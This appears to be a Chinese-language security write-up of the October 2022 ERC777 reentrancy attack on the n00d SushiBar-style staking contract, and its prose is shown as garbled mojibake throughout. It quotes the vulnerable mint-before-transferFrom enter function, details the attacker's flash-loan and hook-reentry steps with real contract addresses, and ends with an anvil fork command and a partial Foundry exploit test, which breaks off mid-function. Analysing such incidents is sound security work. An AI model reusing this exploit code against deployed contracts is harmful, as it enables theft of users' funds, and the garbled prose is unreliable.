# 4700 ä¸‡ç¾å…ƒæŸå¤±ï¼ŒXn00d åˆçº¦æ¼æ´æ”»å‡»äº‹ä»¶åˆ†æ

# åŸºç¡€çŸ¥è¯†

## **ERC777**

ERC777 æ˜¯ ERC20 æ ‡å‡†çš„é«˜çº§ä»£å¸æ ‡å‡†ï¼Œè¦æä¾›äº†ä¸€äº›æ–°çš„åŠŸèƒ½ï¼šè¿è¥å•†åŠé’©å­ã€‚

- è¿è¥å•†åŠŸèƒ½ã€‚é€šè¿‡æ­¤åŠŸèƒ½èƒ½å¤Ÿå…è®¸ç¬¬ä¸‰æ–¹è´¦æˆ·ä»£è¡¨æŸä¸€**åˆçº¦æˆ–è€…åœ°å€**
  è¿›è¡Œä»£å¸çš„å‘é€äº¤æ˜“
- é’©å­åŠŸèƒ½ã€‚ç»™è¯¥**åˆçº¦æˆ–è€…åœ°å€**å¯¹å…¶è´¦æˆ·ä¸­çš„ä»£å¸æ›´å¤šçš„æ§åˆ¶æƒï¼Œé˜²æ­¢è¿è¥å•†ä½œæ¶ï¼ŒåŒæ—¶å¯ä»¥å®šä¹‰åœ°å€æˆ–è€…åˆçº¦å¯¹æŸäº›ä»£å¸è¿›è¡Œæ§åˆ¶ä»¥åŠæä¾›æ‹’ç»æ¥æ”¶æŸäº›ä»£å¸åŠŸèƒ½

ä¸¾ä¸ªç®€å•çš„æ —å­è§£é‡Šè¿™ä¸¤ä¸ªåŠŸèƒ½(æ›´å¤šè¯¦ç»†å†…å®¹å¯é˜…è¯»å‚è€ƒéƒ¨åˆ†æä¾›çš„é“¾æ¥)ã€‚
è¿è¥å•†åŠŸèƒ½ï¼šæŸåŒºå—é“¾å…¬å¸çš„è€æ¿ä½¿ç”¨æŸç§åŸºäº ERC777 çš„ A ä»£å¸ä½œä¸ºå·¥èµ„å‘æ”¾ï¼Œå…¬å¸è´¦æˆ·ä¸€å…±æœ‰ 500 ä¸‡çš„ A ä»£å¸ï¼Œè€Œç»è¿‡äººäº‹çš„è®¡ç®—ï¼Œæœ¬æœˆå…±åº”å‘æ€»å·¥èµ„ä¸º 200 ä¸‡ä»£å¸ Aï¼Œé‚£ä¹ˆå…¬å¸è€æ¿å°±å¯ä»¥å°†è´¢åŠ¡çš„ä»¥å¤ªåŠé’±åŒ…åœ°å€ä½œä¸ºè¿è¥å•†ï¼Œå¹¶æˆæƒ 200 ä¸‡ A ä»£å¸çš„ä½¿ç”¨æƒé™ï¼Œé‚£ä¹ˆè´¢åŠ¡ä¾¿æœ‰æƒé™ä½¿ç”¨å…¬å¸åœ°å€ 500 ä¸‡ä¸­çš„ 200 ä¸‡ A ä»£å¸ï¼Œå¹¶ä¸”å¯¹äºå…¬å¸æ¥è¯´ï¼Œå…¶ä½™çš„é‡‘é¢æ˜¯å®‰å…¨çš„ã€‚
é’©å­åŠŸèƒ½ï¼šå¯ç”¨æ¥é™åˆ¶è¿è¥å•†çš„ä¸€äº›æƒé™ã€‚å¦‚å…¬å¸è€æ¿å¯ä»¥é€šè¿‡é’©å­è§„å®šè¿è¥å•†å¯¹å…¬å¸è´¦æˆ·ä¸­æˆæƒçš„ 200 ä¸‡ A ä»£å¸çš„èµ°å‘åšä¸€ä¸ªé™åˆ¶ï¼Œè§„å®šåªèƒ½è½¬å‘æŸäº›å·²ç»æ ‡åå¤‡æ³¨äº†çš„åœ°å€ï¼Œä¾‹å¦‚å…¬å¸å…¨ä½“å‘˜å·¥åœ°å€ï¼Œä»¥åŠé™å®šå•ç¬”å¯å‘é€çš„æœ€å¤§å€¼ç­‰ç­‰ã€‚

# åŸºæœ¬çŸ¥è¯†

## æ”»å‡»çš„èƒŒæ™¯

æ”»å‡»å‘ç”Ÿæ—¶é—´ 2022-10-26 12:46:59
åŒºå—é«˜åº¦ï¼š15826380
æ”»å‡»è€…ï¼š 0x8Ca72F46056D85DB271Dd305F6944f32A9870FF0
å—å®³åˆçº¦ï¼š 0x9C5A2A6431523fBBC648fb83137A20A2C1789C56
pair åˆçº¦ï¼š 0x5476DB8B72337d44A6724277083b1a927c82a389 ä¸º n00dToken ä¸ WETH çš„ pair åˆçº¦ï¼Œä¸º uniswapV2 çš„ pair åˆçº¦ã€‚
**SushiBar ERC20 åˆçº¦åœ°å€ï¼š0x3561081260186E69369E6C32F280836554292E08**
**n00dToken ERC777 åˆçº¦åœ°å€ï¼š 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA**
è¿™ä¸¤ä¸ªåˆçº¦æ˜¯ä»€ä¹ˆå…³ç³»ï¼ŸSushiBar åˆçº¦ä¸­æœ‰ä¸ª sushi çš„åˆçº¦å˜é‡ï¼ŒæŒ‡å‘çš„æ˜¯ n00dTokenï¼Œ

```
contract n00dToken is ERC777 {
    constructor(uint256 initialSupply, address[] memory defaultOperators)
        ERC777("n00dle", "n00d", defaultOperators)
    {
        _mint(msg.sender, initialSupply, "", "");
    }
}
```

![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896456-00617041-95fa-427c-8153-76cc2649e32c.png#averageHue=%23ededed&clientId=uc65f94e3-75ad-4&from=paste&id=u3fd32d33&originHeight=466&originWidth=2842&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u11abf45b-d050-4503-ac9d-44385bb4266&title=)
**æ”»å‡»æœ€ç»ˆè·åˆ©å¤šå°‘å‘¢ï¼Ÿ**
é€šè¿‡ä¸Šå›¾ï¼Œä»èµ„äº§è½¬ç§»æ¥çœ‹ï¼Œæœ€ç»ˆçš„æ”»å‡»æ•ˆæœæ˜¯ï¼Œé»‘å®¢æ”»å‡»äº† SushiBar åˆçº¦ï¼Œä» SushiBar åˆçº¦ä¸­æå–äº† 42,752 ä»·å€¼çš„ n00dTokenï¼Œç”¨ 42,752 çš„ n00dToken åœ¨ Uniswap ä¸­æ¢äº†ä»·å€¼ 29,388 çš„ WETHï¼Œæœ€åå°† 29,388 çš„ WETH æ¢æˆäº† ETH.

## **sushiBar åˆçº¦çš„ enter å‡½æ•°ä»£ç **

åŠŸèƒ½ï¼šå°† n00dToken å…‘æ¢æˆ bar å¸ã€‚
è¾“å…¥ï¼šè¦å…‘æ¢çš„ n00dToken çš„æ•°é‡ã€‚
è¾“å‡ºï¼šå…‘æ¢å‡º bar å¸åˆ° msg.sender ä¸­ã€‚
å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­
mint å‡ºå‡­è¯ï¼Œå¾—åˆ°å‘é€è€…çš„ noodTokenã€‚ï¼ˆæ³¨æ„è¿™é‡Œçš„é¡ºåºï¼Œæ˜¯å…ˆ mintï¼Œåå¾—åˆ° noodTokenï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´å‡ºç°çš„åŸå› ï¼‰
è°ƒç”¨ enter åï¼ŒsushiBar åˆçº¦ä¼š mint å‡ºä¸€å®šæ•°é‡çš„å‡­è¯ï¼Œç„¶åä» noodToken ä¸­è½¬ç§»\_amount æ•°é‡çš„ noodToken åˆ° sushiBar åˆçº¦ä¸­ã€‚

```
// Enter the bar. Pay some SUSHIs. Earn some shares.
    function enter(uint256 _amount) public {
        uint256 totalSushi = sushi.balanceOf(address(this));
        uint256 totalShares = totalSupply();
        if (totalShares == 0 || totalSushi == 0) {
            _mint(msg.sender, _amount);
        } else {
            uint256 what = _amount.mul(totalShares).div(totalSushi);
            _mint(msg.sender, what);
        }
        sushi.transferFrom(msg.sender, address(this), _amount);
    }
```

// enter çš„è®¡ç®—æ–¹å¼: uint barSwapCount = enterAmount.mul(bar.totalSupply()).div(n00d.balanceOf(BARADDR));
å‡è®¾è¾“å…¥çš„ n00dToken å¸æ•°é‡ä¸º nï¼Œå¯å…‘æ¢å‡ºçš„ bar çš„æ•°é‡ä¸º bï¼Œbar åˆçº¦çš„ totalSupply ä¸º Tï¼Œbar åˆçº¦çš„ n00dToken ä½™é¢(n00d.balanceOf(BARADDR))ä¸º Bã€‚åˆ™æœ‰
b=n\*T/B (1)
enter å®Œæˆåï¼ŒT çš„å€¼å’Œ B çš„å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå„è‡ªçš„å˜é‡å‡½æ•°å¦‚ä¸‹ï¼š
Tâ€˜ = T + b (2)
Bâ€™ = B + n (3)

## **sushiBar åˆçº¦çš„ leave å‡½æ•°ä»£ç **

åŠŸèƒ½ï¼šå°† bar å¸å…‘æ¢æˆ n00dTokenã€‚
è¾“å…¥: è¦å…‘æ¢çš„ bar å¸çš„æ•°é‡
è¾“å‡ºï¼šå…‘æ¢å‡º n00dToken åˆ° msg.sender

```
function leave(uint256 _share) public {
        uint256 totalShares = totalSupply();
        uint256 what = _share.mul(sushi.balanceOf(address(this))).div(totalShares);
        _burn(msg.sender, _share);
        sushi.transfer(msg.sender, what);
    }
}
```

// uint n00dSwapCount = (bar.balanceOf(address(this)).mul(n00d.balanceOf(BARADDR))).div(bar.totalSupply());
å‡è®¾è¾“å…¥çš„ bar å¸æ•°é‡ä¸º bâ€™ï¼Œå¯å…‘æ¢å‡ºçš„ n00dToken çš„æ•°é‡ä¸º nâ€™ï¼Œbar åˆçº¦çš„ totalSupply ä¸º Tâ€™ï¼Œbar åˆçº¦çš„ n00dToken ä½™é¢(n00d.balanceOf(BARADDR))ä¸º Bâ€™ã€‚åˆ™æœ‰
nâ€™=bâ€™\*Bâ€™/Tâ€™ (4)

## **SushiBar ä¸ n00dToken çš„å…³ç³»**

å‡è®¾è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šç”¨æˆ·åœ¨ enter ä¸­ä½¿ç”¨ n ä¸ª n00dTokenï¼Œmint å‡º b ä¸ª bar å¸ã€‚å¦‚æœè¿™ä¸ªç”¨æˆ·åœ¨ leave ä¸­ burn æ‰è¿™ b ä¸ª bar å¸ï¼Œå¯ä»¥å¾—åˆ°å¤šå°‘ä¸ª n00dToken?
æ ¹æ® 4ï¼Œå¾—åˆ°çš„ nâ€™=bâ€™*Bâ€™/Tâ€™
å› ä¸º bâ€™å°±æ˜¯ mint å‡ºæ¥çš„ï¼Œæ‰€ä»¥ bâ€™=b
æ‰€ä»¥ nâ€™=bâ€™*Bâ€™/Tâ€™ ï¼ bBâ€™/Tâ€™ å°†(2)ä»£å…¥ = bBâ€™/(T+b) å°†(1)æ¢æˆ T=bB/n ä»£å…¥ ï¼ bBâ€™/(bB/n + b)= n
æ‰€ä»¥ä½¿ç”¨ n ä¸ª n00dToken mint çš„ b ä¸ª bar å¸ï¼Œç›´æ¥ leave æ‰çš„è¯ï¼Œè¿˜ä¼šå¾—åˆ° n ä¸ª n00dToken.

# æ¼æ´åŸç†

æ¼æ´å…³é”®ç‚¹ï¼š

## 1.å…ˆ mint å transferFrom çš„æ¼æ´ä»£ç 

æ¼æ´å‡ºç°åœ¨ä¸Šé¢çš„ shiBar åˆçº¦çš„ enter å‡½æ•°ä¸­,shiBar åˆçº¦ä¸­ï¼Œä¸»è¦æ˜¯å› ä¸ºå…ˆæ‰§è¡Œäº† mintï¼Œåæ‰§è¡Œäº† transferFromã€‚

```
// Enter the bar. Pay some SUSHIs. Earn some shares.
    function enter(uint256 _amount) public {
        uint256 totalSushi = sushi.balanceOf(address(this));
        uint256 totalShares = totalSupply();
        if (totalShares == 0 || totalSushi == 0) {
            _mint(msg.sender, _amount);
        } else {
            uint256 what = _amount.mul(totalShares).div(totalSushi);
            _mint(msg.sender, what);
        }
        sushi.transferFrom(msg.sender, address(this), _amount);
    }
```

## 2. ERC777 çš„é’©å­å‡½æ•°ã€‚

n00dToken ä½¿ç”¨äº† ERC777 çš„è§„èŒƒï¼Œæ‰€ä»¥å¯ä»¥å¯¹ n00dToken è®¾ç½®é’©å­å‡½æ•°ï¼Œä»è€Œå¯ä»¥åŠ«æŒ 1 ä¸­çš„ transfromï¼Œåœ¨é’©å­å‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ enter å®ç°é‡å…¥ã€‚
ğŸ’© ç ”ç©¶å‘ç°ï¼Œå…ˆ mint å transFrom çš„åˆçº¦è¿˜æ˜¯æœ‰å¾ˆå¤šçš„ã€‚æ¯”å¦‚ä¸‹é¢çš„ï¼š
0x8798249câ€¦â€¦1865ff4272
0xf7a038375â€¦â€¦ff98e3790202b3
0x9257fb8faâ€¦â€¦47403617b1938
0x36b679bdâ€¦â€¦dcb892cb66bd4cbb

# æ¼æ´åˆ†æ

å…¸å‹çš„é‡å…¥æ¼æ´ï¼Œåˆ†æé‡å…¥æ¼æ´ä¸¤æ¿æ–§ï¼š

1. æ‰¾å¾ªç¯
2. æ‰¾ä»£å¸å˜åŒ–ã€‚

æ‰¾å¾ªç¯çš„è°ƒç”¨å…³ç³»
bar.enter()â†’bar.mint()â†’hack.tokensToSendâ†’bar.enterâ†’bar.mint()â†’hack.tokensToSendâ†’â€¦..
â†’n00dToken.transferFrom
æ ‡é¢œè‰²çš„ä¸¤ä¸ªéƒ¨åˆ†å®ç°äº†å¾ªç¯è°ƒç”¨ï¼Œåœ¨å¾ªç¯è°ƒç”¨å®Œæˆå(è¿™æ—¶å·²ç»è°ƒç”¨äº†å¤šæ¬¡çš„ mint)æ‰ä¼šè°ƒç”¨ n00dToken.transferFrom è¿›è¡Œè½¬è´¦ã€‚
æ‰¾ä»£å¸å˜åŒ–
â€œåƒäº†ä¸¤ç¢—çš„ç²‰ï¼Œåªç»™äº†ä¸€ç¢—çš„é’±â€ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œè°ƒç”¨å®Œä¸€æ¬¡ mintï¼Œå°±ä¼šè½¬è´¦ï¼Œç„¶åæ›´æ–°å„ç±»çš„ balanceã€‚ä½†åœ¨é‡å…¥çš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨äº†ç¬¬ 1 æ¬¡çš„ mintï¼Œæ²¡è¿›è¡Œè½¬è´¦å’Œ balance æ›´æ–°ï¼Œåˆè°ƒç”¨ç¬¬ 2 æ¬¡ mintï¼Œä¹Ÿæ²¡è¿›è¡Œè½¬è´¦å’Œ balance æ›´æ–°ï¼Œç›´åˆ° n æ¬¡é‡å…¥å®Œæˆåï¼Œæ‰è¿›è¡Œç¬¬ 1 æ¬¡ mint æ—¶çš„è½¬è´¦å’Œ balance æ›´æ–°ï¼Œç›¸åŒäºç¬¬ 2,3â€¦â€¦,n æ¬¡æ—¶è¿˜æ˜¯ç”¨ç¬¬ 1 æ¬¡ mint æ—¶çš„ä»·æ ¼ç»“çš„è´¦ã€‚

## 1.å¾ªç¯è°ƒç”¨

bar.enter()ä¸­å…ˆ mint å transferï¼Œtransfer ä¼šè°ƒç”¨åˆ°é»‘å®¢çš„ tokensToSend,é»‘å®¢åœ¨ tokensToSend å‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ bar.enter()

## 2.ä»£å¸å˜åŒ–

æ­£å¸¸æƒ…å†µä¸é‡å…¥çŠ¶æ€ä¸‹çš„ä»£å¸çš„å˜åŒ–
ğŸ’© æ€»ç»“ï¼š 1.æ­£å¸¸æƒ…å†µä¸‹ï¼ŒåŒç­‰æ•°é‡çš„ n00dToken ä¼š mint å‡ºç›¸åŒæ•°é‡çš„ barã€‚ 2.æ­£å¸¸æƒ…å†µä¸‹å’Œé‡å…¥æ”»å‡»æƒ…å†µä¸‹ï¼Œæœ€ç»ˆçš„ n00d.balanceOf(bar)ä¼šç›¸åŒï¼Œä½† bar.supply é‡å…¥æ”»å‡»æƒ…å†µä¸‹æ¯”æ­£å¸¸æƒ…å†µä¸‹å¤§ã€‚ å› ä¸ºé‡å…¥ä¸­ï¼Œæœ€ç»ˆçš„ transferFrom éƒ½ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥ n00d.balanceOf(bar)ä¼šç›¸åŒã€‚ è€Œç”±äºå·®ä»·çš„æ”¹å˜ï¼Œé‡å…¥æ—¶å¤š mint äº† barï¼Œæ‰€ä»¥ bar.supply é‡å…¥æ”»å‡»æƒ…å†µä¸‹æ¯”æ­£å¸¸æƒ…å†µä¸‹å¤§ã€‚ 3. é‡å…¥æ”»å‡»çš„ä½œç”¨å°±æ˜¯åœ¨æ‹–å»¶äº† transferFrom çš„æ‰§è¡Œï¼Œå› ä¸º transferFrom ä¼šå¼•èµ·ä»·æ ¼å˜åŒ–ï¼Œæ‹–å»¶ transferFrom çš„æ‰§è¡Œå°±ç›¸åŒäºå»¶ç¼“äº†ä»·æ ¼å˜åŒ–ï¼Œç”¨ä½ä»· mint äº†åé¢å‡ æ¬¡ã€‚
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896437-e133109d-6ce0-4156-a63f-67a9112772aa.png#averageHue=%23eee7e6&clientId=uc65f94e3-75ad-4&from=paste&id=u067dd927&originHeight=1978&originWidth=1782&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u62e37881-ca02-4263-8bbc-393d854af6e&title=)
æˆ‘ä»¬å¯ä»¥æ¯”è¾ƒåœ¨å½“æ—¶çš„åŒºå—ä¸Šï¼Œæ­£å¸¸è½¬è´¦ä¸é‡å…¥æ”»å‡»çŠ¶æ€ä¸‹è½¬è´¦çš„æƒ…å†µã€‚

### æ­£å¸¸è½¬è´¦æƒ…å†µ

ä¸è®ºæ˜¯ä¸€æ€§è½¬å…¥è¿˜æ˜¯åˆ†ä¸‰æ¬¡è½¬ã€‚æœ€ç»ˆ mint å‡ºæ¥çš„ bar çš„æ•°é‡æ˜¯ä¸€è‡´çš„,éƒ½ä¸º 14900396190115982310618ã€‚

- ä¸€æ¬¡æ€§ entry 15110473474058799859170 = 3 \* 5036824491352933286390, ä¼š mint å‡º sushiBar æ•°é‡ä¸º 14900396190115982310618
- åˆ†ä¸‰æ¬¡ï¼Œæ¯æ¬¡ entry 5036824491352933286390ã€‚å¯ä»¥çœ‹åˆ°æ¯æ¬¡ä½¿ç”¨ç›¸åŒçš„ n00dToken éƒ½ä¼šå…‘æ¢å‡ºç›¸åŒçš„ barï¼Œæ¯æ¬¡ mint åéƒ½ä¼šå¼•èµ· bar.supply å’Œ n00d.balanceOf(bar)çš„å˜åŒ–ã€‚ä¸‰æ¬¡å…± mint å‡ºçš„ bar æ•°é‡: 14900396190115982310618
  ç¬¬ä¸€æ¬¡ mint å‡ºçš„ bar æ•°é‡: 4966798730038660770206
  ç¬¬äºŒæ¬¡ mint å‡ºçš„ bar æ•°é‡: 4966798730038660770206
  ç¬¬ä¸‰æ¬¡ mint å‡ºçš„ bar æ•°é‡: 4966798730038660770206 åœ¨è¿™ä¸‰æ¬¡ mint çš„è¿‡ç¨‹ä¸­ï¼Œbar.supply å’Œ n00d.balanceOf(bar)çš„å˜åŒ–æƒ…å†µå¦‚ä¸‹ï¼šbar.supply: 7946728885657408588790 , n00d.ban: 8058768001881461618923Enter 5036824491352933286390 n00d -> **4966798730038660770206** barbar.supply: 12913527615696069358996, n00d.ban: 13095592493234394905313Enter 5036824491352933286390 n00d -> **4966798730038660770206** barbar.supply: 17880326345734730129202, n00d.ban: 18132416984587328191703Enter 5036824491352933286390 n00d -> **4966798730038660770206** barbar.supply: 22847125075773390899408, n00d.ban: 23169241475940261478093 åŠ ç²—çš„è¡¨ç¤ºæ¯æ¬¡ mint å‡ºæ¥çš„ bar çš„æ•°é‡ã€‚æ£•è‰²åº•çš„æ•°å€¼ä¸Šé¢çš„ä¸¤ä¸ªåŠ èµ·æ¥ä¼šç­‰äºä¸‹é¢çš„ã€‚ç»¿è‰²çš„æ•°å€¼ä¸Šé¢çš„ä¸¤ä¸ªåŠ èµ·æ¥ä¼šç­‰äºä¸‹é¢çš„ã€‚

### é‡å…¥æ”»å‡»æƒ…å†µä¸‹

è€Œåœ¨é‡å…¥æƒ…å†µä¸‹ã€‚mint å‡ºæ¥çš„ bar æ•°é‡ä¸º 34100275953928728876790>14900396190115982310618ã€‚
åœ¨æ”»å‡»ä¸­ï¼Œä¸€å…±è¾“å…¥ 5036824491352933286390 è¿›è¡Œäº† 3 æ¬¡çš„ entryã€‚å…± mint å‡º 26153547068271320288007ã€‚
æ”»å‡»ä¸­å…±è°ƒç”¨äº†ä¸‰æ¬¡ entryï¼Œæ¯æ¬¡ mint å‡ºæ¥çš„æ•°é‡å¦‚ä¸‹ï¼š
before Enter]bar.supply: 7946728885657408588790 , n00d.ban: 8058768001881461618923
ä¸‰æ¬¡å…± mintï¼š26153547068271320288007
ç¬¬ä¸€æ¬¡ mint: 4966798730038660770207
ç¬¬äºŒæ¬¡ mint: 8071106172719568973063
ç¬¬ä¸‰æ¬¡ mint: 13115642165513090544737
bar.supply: 34100275953928728876790, n00d.ban: 23169241475940261478093
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896523-84d78e26-2be6-4c04-85af-d07c6e53c4c2.png#averageHue=%23eae3e2&clientId=uc65f94e3-75ad-4&from=paste&id=ud91eb4e3&originHeight=1458&originWidth=3196&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u572aaf29-6a88-4efb-bab4-c21e02390d6&title=)
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872896487-edb0ba4e-44fa-413f-b432-6470f8ae3aa4.png#averageHue=%23eceae9&clientId=uc65f94e3-75ad-4&from=paste&id=u71db09f5&originHeight=1906&originWidth=3348&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uc6a5229e-60ca-4325-ad94-3a889dfe852&title=)

# é»‘å®¢æ”»å‡»è¿‡ç¨‹

è°ƒç”¨è¿‡ç¨‹ï¼ŒhackEOA è°ƒç”¨äº† hackCon çš„ fc7e3db8 å‡½æ•°ã€‚

1. è°ƒç”¨[[ERC1820Registry]](https://etherscan.io/address/0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementerï¼Œè¿™æ ·åœ¨ERC777è½¬è´¦çš„é’©å­å‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ°æ³¨å†Œçš„å®ç°å‡½æ•°ã€‚
2. [[UniswapV2Pair]](https://etherscan.io/address/0x5476DB8B72337d44A6724277083b1a927c82a389).getReserves()ã€‚è®¡ç®—å‡ºpairåˆçº¦ä¸­çš„n00dTokençš„å‚¨å¤‡é‡ã€‚
3. **n00dToke.approve(SushiBar,10073648982705866572782000)ã€‚æ ¹æ® 2 ä¸­è®¡ç®—å‡ºçš„**n00dToken çš„å‚¨å¤‡é‡æ¥è¿›è¡Œæˆæƒï¼Œæˆæƒçš„æ•°é‡ä¸ºå‚¨å¤‡é‡\*500
4. è¿›è¡Œ uniswap ä¸­çš„é—ªç”µè´·åŠŸèƒ½ã€‚è°ƒç”¨ uniswapV2Pair çš„ swapã€‚è´·å‡º pair åˆçº¦ä¸­çš„æ‰€æœ‰çš„ n00dTokenï¼Œä½¿ç”¨ data ä½¿ç”¨ 0x333ï¼Œä¼šè§¦å‘å›è°ƒ hackCon åˆçº¦çš„ uniswapV2Call å‡½æ•°
5. hackCon åˆçº¦çš„ uniswapV2Call å‡½æ•°
   1. [[SushiBar]](https://etherscan.io/address/0x3561081260186E69369E6C32F280836554292E08).enter(_amount=5036824491352933286391)ğŸ’© ä¸ºä»€ä¹ˆ enter è¿™ä¸ªæ•°å­—ï¼Ÿæ¯”å¦‚ç¬¬ä¸€æ¬¡è°ƒç”¨ sushiBar.enter æ—¶ï¼Œè´·å‡ºçš„ n00dToken æ•°é‡ä¸ºï¼š20147297965411733145563ï¼Œå´åªä½¿ç”¨äº† 5036824491352933286391ï¼Ÿå› ä¸º enter æ—¶åªæ‹¿å‡ºäº† 1/4 çš„è¿›å…¥ sushiBar.enter é‚£ä¸ºä»€ä¹ˆæ‹¿ 1/4 è¿›å…¥ï¼Ÿ
      å¦å¤–çš„ 2/3 ç”¨äºé’©å­å‡½æ•°ä¸­ tokensToSend ä¸­ï¼Œåœ¨é‡å…¥æ—¶çš„ä½¿ç”¨ã€‚æ¯æ¬¡é‡å…¥æ‰§è¡Œ 3 æ¬¡ enterï¼Œæ¯æ¬¡ä½¿ç”¨ 1/3 çš„è´·æ¬¾ enter å‡½æ•°çš„ä¸»è¦æ“ä½œä¸»è¦æœ‰ä¸¤ä¸ªï¼š1.mint å‡ºå‡­è¯ã€‚2.ä»è°ƒç”¨è€…è·å¾— noodToken çš„è¾“å…¥ã€‚è¿™ä¸¤ä¸ªæ˜¯æŒ‰ä» 1 åˆ° 2 çš„é¡ºåºæ‰§è¡Œçš„ã€‚åœ¨æ‰§è¡ŒåŠ¨ä½œ 2 æ—¶ä¼šè°ƒç”¨åˆ° n00dToken çš„ transferFromï¼Œå› ä¸º n00dToken æ˜¯ ERC777ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°é’©å­å‡½æ•°ï¼Œå¯¹åº”ç€ hackCon çš„ tokensToSend å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°æ˜¯é»‘å®¢åˆçº¦ä¸­è‡ªå·±å†™çš„ä»£ç ï¼Œé»‘å®¢åœ¨è¿™ä¸ªå‡½æ•°ä¸­åˆè°ƒç”¨äº† SushiBar çš„ enter å‡½æ•°ã€‚è‡³æ­¤ï¼Œè¿™ä¸€æ­¥çš„è°ƒç”¨è¿‡ç¨‹ä» enter æ¥ï¼Œæœ€ç»ˆåˆè°ƒç”¨ enterï¼Œä¸€ä¸ªå¾ªç¯å°±æ­¤äº§ç”Ÿï¼Œä¹Ÿå°±æ˜¯é‡å…¥æ”»å‡»ã€‚åœ¨è¿™é‡Œæ‰§è¡Œ 3 æ¬¡åï¼Œå¾—åˆ°ä¸€å¤§ç¬”å‡­è¯ã€‚
   2. [[SushiBar]](https://etherscan.io/address/0x3561081260186E69369E6C32F280836554292E08).leaveï¼Œä¼šå°†å‡­è¯æ¯æ‰ï¼Œå–å›n00dToken
   3. å°†å–å› n00dToken å½’è¿˜é—ªç”µè´·çš„æœ¬æ¯ã€‚
6. å°†æ­¤æ—¶çš„æ‰€æœ‰çš„ n00dToken åœ¨ uniswap ä¸­å…‘æ¢æˆ WETHã€‚
7. å¾ªç¯æ‰§è¡Œä¸Šé¢çš„ 2-5 æ­¥ï¼Œé‡å¤ 4 æ¬¡ã€‚æœ€ç»ˆå¾—åˆ° 20.82 ä¸ª WETH.

# æ¼æ´å¤ç°

å‚è€ƒä»£ç (å¯è”ç³»è·å–)ï¼š

```
anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 15826379
```

ä»£ç ä¸­æœ‰ 3 è¦è¦æ³¨æ„çš„å˜é‡ï¼Œè¿™ä¸‰ä¸ªå˜é‡æ ¹æ®é‡å…¥æ¼æ´å’Œæ± å­ reserve çš„ä¸åŒï¼Œè¿½æ±‚åˆ©ç›Šæœ€å¤§åŒ–æ—¶è¦åŠ¨æ€è°ƒæ•´ã€‚

- uint ATTACK_COUNT = 4; // è®°å½•å…±è¿›è¡Œäº†å‡ æ¬¡æ”»å‡»
- uint RECOUNT_PER_ATTACK = 2; // è®°å½•æ¯æ¬¡æ”»å‡»ä¸­æ‰§è¡Œå‡ æ¬¡é‡å…¥æ“ä½œ
- enterAmount //åœ¨é—ªç”µè´·è°ƒç”¨å‡½æ•°ä¸­ uniswapV2Callï¼Œå°†è´·å…¥çš„èµ„é‡‘åˆ†äº†å‡ ä»½ï¼Œè¡¨ç¤ºæ¯ä»½èµ„é‡‘çš„æ•°é‡ï¼Œé»‘å®¢æ”»å‡»è¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ˜¯ 4,å› ä¸ºå…±æ‰§è¡Œäº† 3 æ¬¡ enter,éœ€è¦ç”¨åˆ° 3 ä»½èµ„é‡‘,è¿™é‡Œå°±æ¯” 3 å¤šåˆ†äº†ä¸€ä»½ã€‚

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/interface.sol";
import "../src/SushiBar.sol";
import "forge-std/console2.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract ContractTest is Test{
    using SafeMath for uint256;
    address constant N00DADDR = 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA;
    address constant BARADDR = 0x3561081260186E69369E6C32F280836554292E08;

    IERC777 n00d = IERC777(N00DADDR);
    sushiBar bar = sushiBar(BARADDR);
    Uni_Pair_V2 pair = Uni_Pair_V2(0x5476DB8B72337d44A6724277083b1a927c82a389);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC1820Registry registry = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint enterAmount = 0;
    uint ATTACK_COUNT = 4; //ã€€è®°å½•å…±è¿›è¡Œäº†å‡ æ¬¡æ”»å‡»
    uint RECOUNT_PER_ATTACK = 2; //ã€€è®°å½•æ¯æ¬¡æ”»å‡»ä¸­æ‰§è¡Œå‡ æ¬¡é‡å…¥æ“ä½œ
    uint curCountPerAttack = 0;
    uint n00dReserve;
    uint wethReserve;
    function setUp() public {
        // cheats.createSelectFork("mainnet", 15826379);
    }



    function testExploit() public{
        registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));
        for (uint256 curAttCount = 0; curAttCount < ATTACK_COUNT; curAttCount++) { //ã€€å…±æ‰§è¡Œ4æ¬¡æ”»å‡»
            console2.log("\n[Attack times: %d]", curAttCount);
            curCountPerAttack = 0; // æ¯è½®æ”»å‡»ä¹‹å‰ï¼Œå°†é‡å…¥çš„æ¬¡æ•°å½’0

            (n00dReserve, wethReserve, ) = pair.getReserves();
            console2.log("\nPair n00dReserve: %d, wethReserve: %d", n00dReserve, wethReserve);
            n00d.approve(BARADDR, ~uint(0));
            bytes memory data = "0x333";
